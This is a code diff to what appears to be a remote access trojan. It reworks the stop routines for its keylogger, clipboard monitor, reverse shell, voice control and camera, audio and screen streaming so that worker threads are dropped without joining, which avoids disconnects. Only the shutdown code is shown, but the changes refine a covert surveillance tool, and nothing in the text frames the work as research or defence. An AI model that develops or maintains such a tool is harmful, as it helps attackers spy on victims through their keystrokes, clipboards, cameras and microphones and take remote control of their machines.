@@ -5561,16 +5561,41 @@ def start_streaming(agent_id):
         log_message("Started smart video streaming (WebRTC preferred, Socket.IO fallback).")
 
 def stop_streaming():
-    global STREAMING_ENABLED, STREAM_THREAD
+    global STREAMING_ENABLED, STREAM_THREAD, STREAM_THREADS, capture_queue, encode_queue
     
     with _stream_lock:  # ✅ THREAD-SAFE
         if not STREAMING_ENABLED:
             return
         
         STREAMING_ENABLED = False
-        if STREAM_THREAD:
-            STREAM_THREAD.join(timeout=2)
+        
+        # Clear queues to wake up any waiting threads (non-blocking)
+        try:
+            if capture_queue:
+                while not capture_queue.empty():
+                    try:
+                        capture_queue.get_nowait()
+                    except:
+                        break
+        except:
+            pass
+        
+        try:
+            if encode_queue:
+                while not encode_queue.empty():
+                    try:
+                        encode_queue.get_nowait()
+                    except:
+                        break
+        except:
+            pass
+        
+        # Don't join threads - they're daemon threads and will exit naturally
+        # This prevents blocking the main thread and causing disconnects
         STREAM_THREAD = None
+        STREAM_THREADS = []
+        capture_queue = None
+        encode_queue = None
         log_message("Stopped video stream.")
 
 def start_audio_streaming(agent_id):
@@ -5623,10 +5648,29 @@ def stop_audio_streaming():
         
         AUDIO_STREAMING_ENABLED = False
         
-        # Wait for all threads to stop
-        for thread in AUDIO_STREAM_THREADS:
-            thread.join(timeout=2)
+        # Clear queues to wake up any waiting threads (non-blocking)
+        try:
+            if audio_capture_queue:
+                while not audio_capture_queue.empty():
+                    try:
+                        audio_capture_queue.get_nowait()
+                    except:
+                        break
+        except:
+            pass
         
+        try:
+            if audio_encode_queue:
+                while not audio_encode_queue.empty():
+                    try:
+                        audio_encode_queue.get_nowait()
+                    except:
+                        break
+        except:
+            pass
+        
+        # Don't join threads - they're daemon threads and will exit naturally
+        # This prevents blocking the main thread and causing disconnects
         AUDIO_STREAM_THREADS = []
         audio_capture_queue = None
         audio_encode_queue = None
@@ -5667,10 +5711,29 @@ def stop_camera_streaming():
         
         CAMERA_STREAMING_ENABLED = False
         
-        # Wait for all threads to stop
-        for thread in CAMERA_STREAM_THREADS:
-            thread.join(timeout=2)
+        # Clear queues to wake up any waiting threads (non-blocking)
+        try:
+            if camera_capture_queue:
+                while not camera_capture_queue.empty():
+                    try:
+                        camera_capture_queue.get_nowait()
+                    except:
+                        break
+        except:
+            pass
         
+        try:
+            if camera_encode_queue:
+                while not camera_encode_queue.empty():
+                    try:
+                        camera_encode_queue.get_nowait()
+                    except:
+                        break
+        except:
+            pass
+        
+        # Don't join threads - they're daemon threads and will exit naturally
+        # This prevents blocking the main thread and causing disconnects
         CAMERA_STREAM_THREADS = []
         camera_capture_queue = None
         camera_encode_queue = None
@@ -6825,11 +6888,7 @@ def stop_reverse_shell():
                 REVERSE_SHELL_SOCKET.close()
             except:
                 pass
-        if REVERSE_SHELL_THREAD and REVERSE_SHELL_THREAD.is_alive():
-            try:
-                REVERSE_SHELL_THREAD.join(timeout=1)  # Reduced timeout
-            except Exception as e:
-                log_message(f"Warning: Could not join reverse shell thread: {e}")
+        # Don't join - daemon thread will exit naturally (prevents blocking)
         REVERSE_SHELL_THREAD = None
         log_message("Stopped reverse shell.")
 # --- Voice Control Functions ---
@@ -6943,8 +7002,7 @@ def stop_voice_control():
             return
         
         VOICE_CONTROL_ENABLED = False
-        if VOICE_CONTROL_THREAD:
-            VOICE_CONTROL_THREAD.join(timeout=2)
+        # Don't join - daemon thread will exit naturally (prevents blocking)
         VOICE_CONTROL_THREAD = None
         log_message("Stopped voice control.")
 
@@ -7292,8 +7350,7 @@ def stop_keylogger():
             return
         
         KEYLOGGER_ENABLED = False
-        if KEYLOGGER_THREAD:
-            KEYLOGGER_THREAD.join(timeout=2)
+        # Don't join - daemon thread will exit naturally (prevents blocking)
         KEYLOGGER_THREAD = None
         log_message("Stopped keylogger.")
 
@@ -7391,8 +7448,7 @@ def stop_clipboard_monitor():
             return
         
         CLIPBOARD_MONITOR_ENABLED = False
-        if CLIPBOARD_MONITOR_THREAD:
-            CLIPBOARD_MONITOR_THREAD.join(timeout=2)
+        # Don't join - daemon thread will exit naturally (prevents blocking)
         CLIPBOARD_MONITOR_THREAD = None
         log_message("Stopped clipboard monitor.")
 
